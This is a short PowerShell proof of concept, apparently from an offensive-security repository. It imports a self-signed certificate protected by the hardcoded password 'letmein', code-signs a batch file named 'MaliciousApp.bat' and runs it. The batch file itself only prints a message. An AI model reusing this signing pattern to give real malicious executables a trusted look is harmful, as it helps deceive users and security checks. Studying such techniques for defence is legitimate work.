$password = "letmein"
$certFile = "SelfSignedCert.pfx"
$maliciousFile = "MaliciousApp.bat"

$signtoolPath = "C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\signtool.exe"
Set-Location "C:\Users\antho\Documents\GitHub\POC-CVE-for-offensive-security\POC\"
Start-Process -Wait -FilePath "certutil.exe" -ArgumentList "-v -p `"$password`" -importPFX $certFile"
Set-Content -Path $maliciousFile -Value "echo This is a malicious application!"
Add-Content -Path $maliciousFile -Value "pause"
Start-Process -Wait -FilePath $signtoolPath -ArgumentList "sign /f $certFile /p `"$password`" /tr http://timestamp.digicert.com /td SHA256 $maliciousFile"
Start-Process -FilePath $maliciousFile
